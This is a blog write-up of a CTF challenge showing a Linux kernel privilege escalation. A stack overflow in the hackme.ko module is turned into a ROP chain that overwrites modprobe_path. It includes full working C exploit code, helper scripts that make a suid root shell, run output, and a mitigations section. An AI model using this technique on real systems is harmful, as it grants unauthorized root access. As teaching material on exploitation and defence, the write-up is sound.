---
layout: post
category: Computer Stuff
tagline: Another Technique to Exploit a Buffer Overflows in Kernel Space
tags: [hacking, ctf, writeup]
---

In this post, I want to explore another technique to exploit a buffer
overflow in the Linux kernel.

In a [previous post]({% post_url 2024-12-17-introduction-to-linux-kernel-exploitation %}) i used the functions `commit_creds(prepare_kernel_creds(0))` to elevate privileges to root.
In this post, I want to demonstrate another way that involves 
overwriting the symbol `modprobe_path` in the kernel.

This was swiftly mentioned in my previous post in a section called `KPTI Bypass 3: Abuse Modprobe`.
There, I wrote:

> The whole procedure is reminiscent of the fine intricacies of a theater play, albeit with actors that have strange names.

However, as with all complex techniques, they become easy, once you
grasp them.
The technique is not novel and can be found in multiple CTF writeups.

# The Technique

When we are executing (`execve()`) a file, the kernel checks if there is an appropriate loader for the file.
This is done by checking the file signature, i.e., the magic bytes, of the file.
If the file signature is unknown and if the file signature is not printable, then the kernel tries to load a kernel module that can handle this file type.

In order to load the appropriate kernel module, the kernel looks at the symbol `modprobe_path`.
In a regular system, this contains the string `/sbin/modprobe`.

We can check this as follows:
```
$ cat /proc/sys/kernel/modprobe
/sbin/modprobe
```

The program `/sbin/modprobe` is executed to load a kernel module called
`binfmt-xxxxxxxx`, where `xxxxxxxx` are the first four magic bytes in hex of the executable with the unknown file signature.
This kernel module `binfmt-xxxxxxxx` provides the binary loader for the executable.
If this works, then the executable can be executed, and we are done.

An attacker could tamper with the value of the kernel symbol `modprobe_path`, as it is stored in a writable page and set it to some other program, that we have written ourselves, let us call it `payload`.
Then, if a binary with unknown file signature is executed, the program at `modprobe_path`, i.e., our `payload` is executed, when the system is in kernel mode, i.e. with root privileges.

# Demonstrating the Technique

In order to demonstrate this technique we are again using the CTF challenge kernel-rop, as in the
[previous post]({% post_url 2024-12-17-introduction-to-linux-kernel-exploitation %}).
Remember, the challenge consists of a vulnerable kernel module called `hackme.ko` that implements a device `/dev/hackme`.
This device implements a stack overflow vulnerability.
It allows us to read and also to overwrite the stack.
The system has full protections: SMEP, SMAP, KPTI and FG-KASLR.
FG-KASLR is like KASLR, but the addresses of each function are randomized instead of just the kernel base.

In order to execute the technique, we need to (i) know the address of `modprobe_path`, (ii) know the address of the `kpti_trampoline` in order to return to the userland, and (iii) have an arbitrary address write primitive.

## Getting the Address of `modprobe_path`

We can adjust `/etc/init.d/rc5` and `/etc/inittab` of the challenge to grant us a root shell and be able to see the kernel symbols at `/proc/kallssyms`.
This allows us to read the address of `modprobe_path` as follows:

```
/ # cat /proc/kallsyms | grep modprobe
ffffffff803e8d80 t __pfx_free_modprobe_argv
ffffffff803e8d90 t free_modprobe_argv
ffffffff821cb260 D modprobe_path
```

However, note that these addresses are subject to FG-KASLR and change each time the system is rebooted.
We can start the system twice and read all the kernel symbols.
This way, we can directly compare that changes resulting from KASLR.

We want to find `modprobe_path`, and the base address of the kernel `_text` or `startup_64`.
The following output is trimmed to only show the relevant results.

```
$ grep -e _text -e modprobe_path kallsyms1.txt 
ffffffffa7200000 T _text
ffffffffa8261820 D modprobe_path
$ grep -e _text -e modprobe_path kallsyms2.txt 
ffffffff83e00000 T _text
ffffffff84e61820 D modprobe_path
```

Here, we see that the distance from the address of `modprobe_path` to the kernel base is constant, in particular, it is `0x1061820`.
Hence, if we know the offset of the kernel base, we can compute the address of `modprobe_path`.
Fortunately, as we have seen in my [previous post]({% post_url 2024-12-17-introduction-to-linux-kernel-exploitation %}) the kernel base is leaked by reading a specific value from the stack.

So, we can compute the address of `modprobe_path` as follows:

{% highlight C %}
kernel_base = leak[38] - 0x0a157UL;
modprobe_path = kernel_base + 0x1061820UL;
{% endhighlight %}

## Getting the Address of the KPTI-Trampoline

Getting the address of the KPTI-Trampoline can be done exactly as in the previous section.
We are looking for the symbol `swapgs_restore_regs_and_return_to_usermode` and then we need to jump to that symbol `+22` in order to skip some pop instructions.
Again, the symbol is located at a fixed offset from the kernel base.

{% highlight C %}
swapgs_restore_regs_and_return_to_usermode = kernel_base + 0x200f10UL; // the offset from /proc/kallsyms
{% endhighlight %}

## Arbitrary Address Write Primitive

Next, we are searching for ROP gadgets in the kernel that allow us to write to an arbitrary address.

I encountered the following few.
```
0xffffffff81007ffc: mov [rcx], rax; xor eax, eax; nop; nop; nop; ret;
0xffffffff810159c8: mov [rax], ecx; pop rbp; ret;
0xffffffff81ba0bb0: mov [rax], edx; ret;
```

Out of these, I decided to use the first one. The gadget is always located at a fixed offset from the kernel base.

{% highlight C %}
write_mem_rcx_rax = kernel_base + 0x7ffcUL; // mov [rcx], rax; xor eax, eax; nop; nop; nop; ret;
{% endhighlight %}

What remains is to write values into rax and rdx.

I encountered the following few gadgets for this.
```
0xffffffff81004a90: pop rdx; pop rcx; pop rax; pop rbp; ret;
0xffffffff81004a91: pop rcx; pop rax; pop rbp; ret;
0xffffffff81004a92: pop rax; pop rbp; ret;
0xffffffff81004d10: pushfq; pop rax; ret;
0xffffffff81004d11: pop rax; ret;
0xffffffff81004857: pop rcx; pop rbp; ret;
```

We already used the `pop rax; ret` in our previous exploit.
Hence, we only need `pop rcx; pop rbp; ret;`.
This clobbers the rbp register, but we do not have to care in this case.
Again, the position of the gadgets can be computed once the address of the kernel base is known.

{% highlight C %}
pop_rax_ret = kernel_base + 0x4d11UL;
pop_rcx_pop_rbp_ret = kernel_base + 0x4857UL; // pop rcx; pop rbp; ret;
{% endhighlight %}

Next, we need to determine which value we are writing into the address of `modprobe_path`. Remember, that this will contain the name of our fake binary loader that is executed with root permissions when a binary with unknown type is started.
We can use `/tmp/a` for that purpose, as we are able to write this file.
Hence, we need to figure out the correct value as integer for that string.

```
(venv) [user]$ ipython
Python 3.13.7 (main, Aug 14 2025, 00:00:00) [GCC 15.2.1 20250808 (Red Hat 15.2.1-1)]
Type 'copyright', 'credits' or 'license' for more information
IPython 8.31.0 -- An enhanced Interactive Python. Type '?' for help.
In [1]: import binascii
In [2]: a = bytearray(b"/tmp/a");
In [3]: a.reverse()
In [4]: binascii.hexlify(a)
Out[4]: b'612f706d742f'
```

At first, I wanted to use `/tmp/myshell` instead of `/tmp/a`.
But this yields `0x6c6c656873796d2f706d742f` which is too long and does not fit into the register.

The plan is to pop the value `0x612f706d742f` from the stack into rax using the gadget `pop rax; ret`. Then, we use the gadget`pop rcx; pop rbp; ret;` to put the KASLR-adjusted value of `modprobe_path` in rcx. We write a dummy value into rbp.
Lastly, we will be using the gadget `mov [rcx], rax; xor eax, eax; nop; nop; nop; ret;` to write the value of rax, i.e. `/tmp/a`, in the address of rcx, i.e. `modprobe_path`.

## The Payload

After we have overwritten `modprobe_path` with `/tmp/a` it remains to put something in `/tmp/a` to elevate our privileges.

As a first attempt, I tried to copy the shell there, change its owner to root, and give it the suid bit.

{% highlight Bash %}
echo "#!/bin/sh" > /tmp/a
echo "cp /bin/sh /tmp/sh" >> /tmp/a
echo "chown 0:0 /tmp/sh" >> /tmp/a
echo "chmod 4755 /tmp/sh" >> /tmp/a
chmod +x /tmp/a
{% endhighlight %}

Running the exploit will give us a suid-shell that belongs to root.
However, modern shells have implemented a mechanism that drops the privileges in such a case.

From the man page of bash:

> If the shell is started with the effective user (group) id not equal to the
> real user (group) id, and the -p option is not supplied, no startup  files
> are read, shell functions are not inherited from the environment, the SHELLOPTS,
> BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment,
> are ignored, and the effective user id is set to the real user
> id. If the -p option is supplied at invocation, the startup behavior is the
> same, but the effective user id is not reset.

Hence, we would need to use `bash -p`. However, we are not running bash at all,
but busybox which has implemented a similar mechanism.
I have not found a flag to circumvent this protection, though.

Other ways such as adding our user to the sudoers file or overwriting the password of the root
user fail as well, as there is no `/etc/passwd` and no `/etc/sudoers` in this environment.

I overcame this issue by compiling my own shell `shell.c`.

{% highlight C %}
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main()
{
    setuid(geteuid());
    system("/bin/sh");
    return 0;
}
{% endhighlight %}

# Final Code and Walkthrough

Now is the time where we can put everything together.

Here is the full C code for exploiting the stack buffer overflow to overwrite `modprobe_path`.

{% highlight C %}
#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>


char *VULN_DRV = "/dev/hackme";

int64_t global_fd = 0;
uint64_t cookie = 0;

// memory locations in the kernel
uint64_t kernel_base;
uint64_t modprobe_path;

// rop gadgets
uint64_t pop_rax_ret; // pop rax; ret
uint64_t pop_rcx_pop_rbp_ret; // pop rcx; pop rbp; ret;
uint64_t write_mem_rcx_rax; // mov [rcx], rax; xor eax, eax; nop; nop; nop; ret;
uint64_t swapgs_restore_regs_and_return_to_usermode; // The KPTI trampoline

// for storing the registers
uint64_t user_cs, user_ss, user_rflags, user_sp;

void open_dev(){
    global_fd = open(VULN_DRV, O_RDWR);
    if (global_fd < 0) {
        printf("[-] failed to open %s\n", VULN_DRV);
        exit(-1);
    } else {
        printf("[+] successfully opened %s\n", VULN_DRV);
    }
}

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

/*
First, we leak the cookie and the base address of the kernel.
This allows us to compute the memory locations of the relevant gadgets
in the section that is affected by ASLR, but not by KASLR.
*/
void leak_cookie() {
    uint8_t sz = 40;
    uint64_t leak[sz];
    printf("[*] trying to leak up to %ld bytes memory\n", sizeof(leak));
    uint64_t data = read(global_fd, leak, sizeof(leak));
    cookie = leak[16];
    printf("[+] leaked cookie: 0x%lx\n", cookie);
    kernel_base = leak[38] - 0x0a157UL;
    printf("[+] leaked kernel_base 0x%lx\n", kernel_base);
    modprobe_path = kernel_base + 0x1061820UL;
    printf("[+] leaked modprobe_path 0x%lx\n", modprobe_path);

    pop_rax_ret = kernel_base + 0x4d11UL;
    write_mem_rcx_rax = kernel_base + 0x7ffcUL; // mov [rcx], rax; xor eax, eax; nop; nop; nop; ret;
    pop_rcx_pop_rbp_ret = kernel_base + 0x4857UL; // pop rcx; pop rbp; ret;
    swapgs_restore_regs_and_return_to_usermode = kernel_base + 0x200f10UL; // the offset from /proc/kallsyms
    printf("[+] leaked swapgs_restore_regs_and_return_to_usermode 0x%lx\n", swapgs_restore_regs_and_return_to_usermode);

}

void land_from_kernel();

void overwrite_mod_path(){
    uint8_t sz = 50;
    uint64_t payload[sz];
    uint64_t cookie_off = 16;

    payload[cookie_off++] = cookie;
    payload[cookie_off++] = (uint64_t) 0;  // RBX
    payload[cookie_off++] = (uint64_t) 0;  // R12
    payload[cookie_off++] = (uint64_t) 0;  // RBP

    // store modprobe_path in rcx
    payload[cookie_off++] = (uint64_t) pop_rcx_pop_rbp_ret; // pop rcx; pop rbp; ret;
    payload[cookie_off++] = (uint64_t) modprobe_path; // -> rcx
    payload[cookie_off++] = (uint64_t) 0; // dummy pop

    // store /tmp/myshell in rax
    payload[cookie_off++] = (uint64_t) pop_rax_ret;
    payload[cookie_off++] = (uint64_t) 0x612f706d742f; // "tmp/a" -> rax

    payload[cookie_off++] = (uint64_t) write_mem_rcx_rax; // mov [rcx], rax; xor eax, eax; nop; nop; nop; ret;

    // return to user space
    payload[cookie_off++] = (uint64_t) swapgs_restore_regs_and_return_to_usermode + 22; // The KPTI trampoline
    payload[cookie_off++] = (uint64_t) 0; // dummy rax
    payload[cookie_off++] = (uint64_t) 0; // dummy rdi

    payload[cookie_off++] = (uint64_t) land_from_kernel;  // where we want to land in user space

    payload[cookie_off++] = (uint64_t) user_cs;
    payload[cookie_off++] = (uint64_t) user_rflags;
    payload[cookie_off++] = (uint64_t) user_sp;
    payload[cookie_off++] = (uint64_t) user_ss;

    write(global_fd, payload, sizeof(payload));
    puts("if you can read this, it did not work.");
}

void land_from_kernel(){
    exit(0);
}

int main(int argc, char **argv){
    open_dev();
    save_state();
    leak_cookie();
    overwrite_mod_path();
    return 0;
}
{% endhighlight %}

If we run this code, it looks as follows.
First, we check the `modprobe_path`.

```
/ $ cat /proc/sys/kernel/modprobe
/sbin/modprobe
```

Executing the exploit overwrites this variable.
```
/ $ ./modprobe
[+] successfully opened /dev/hackme
[*] Saved state
[*] trying to leak up to 320 bytes memory
[+] leaked cookie: 0xfa070f1f392aad00
[+] leaked kernel_base 0xffffffff88a00000
[+] leaked modprobe_path 0xffffffff89a61820
[+] leaked swapgs_restore_regs_and_return_to_usermode 0xffffffff88c00f10
/ $ cat /proc/sys/kernel/modprobe
/tmp/a
```

Next, we create a dummy executable that has no associated binary loader.
{% highlight Bash %}
echo -ne '\xff\xff\xff\xff' > /tmp/dummy
chmod +x /tmp/dummy
{% endhighlight %}

Next, we create the fake modprobe binary that will adjust the privileges on our shell
so it is a suid root shell that does not drop privileges.

{% highlight Bash %}
echo "#!/bin/sh" > /tmp/a
echo "chown 0:0 /shell" >> /tmp/a
echo "chmod 4755 /shell" >> /tmp/a
chmod +x /tmp/a
{% endhighlight %}

Checking the privileges of our compiled shell from `shell.c` we get the following.

```
/ $ ls -lsha shell 
   808 -rwxr-xr-x    1 0        0         804.3K Sep 30 13:32 shell
```

When we execute the dummy executable `/tmp/dummy` the fake modprobe binary `/tmp/a` is executed.
```
/ $ /tmp/dummy 
/tmp/dummy: line 1: ����: not found
```

The fake modprobe binary `/tmp/a` is instructed to load a kernel module that provides a binary loader for `/tmp/dummy`.
However, it does not provide such a loader and thus the execution of `/tmp/dummy` fails.
As a side effect, `/tmp/a` has adjusted the privileges of our shell.

```
/ $ ls -lsha shell 
   808 -rwsr-xr-x    1 0        0         804.3K Sep 30 13:32 shell
```

What remains is to start it, and enjoy our root shell.

```
/ $ id
uid=1000 gid=1000 groups=1000
/ $ ./shell 
/ # id
uid=0 gid=1000 groups=1000
```

# Mitigations

After we have seen how the exploit works, a natural next question is how we can prevent it.
Since kernel version 4.11 there is a pair of configuration variables in the kernel called `CONFIG_STATIC_USERMODEHELPER`
and `CONFIG_STATIC_USERMODEHELPER_PATH` (see [here](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=64e90a8acb8590c2468c919f803652f081e3a4bf)).

You can for example enable
`CONFIG_STATIC_USERMODEHELPER` and set `CONFIG_STATIC_USERMODEHELPER_PATH` to the empty string.
In this combination, all usermode helper programs are disabled, i.e., the kernel will not attempt to load additional kernel modules that can load the unknown binary.

So, in theory the described attack is mitigated since kernel version 4.11 (around 2017).
However, it takes a long time for such hardening measures to be shipped to the distributions.
As an example, I am running a Fedora 42 with a current kernel. But my kernel does not have this measure enabled.

```
[user]$ cat /etc/fedora-release 
Fedora release 42 (Adams)
[user]$ grep -ri CONFIG_STATIC_USERMODEHELPER /boot/config-6.1*
/boot/config-6.15.10-200.fc42.x86_64:# CONFIG_STATIC_USERMODEHELPER is not set
/boot/config-6.16.4-200.fc42.x86_64:# CONFIG_STATIC_USERMODEHELPER is not set
/boot/config-6.16.7-200.fc42.x86_64:# CONFIG_STATIC_USERMODEHELPER is not set
```

# References
As usual, I did not invent all of this by myself.
The ctf writeups by [lkmidas](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/) and [0x434b](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/), especially the section "Version 3: Probing the mods" were very helpful.
Further, regarding the mitigations, I mainly consulted [sam4k](https://sam4k.com/like-techniques-modprobe_path/).
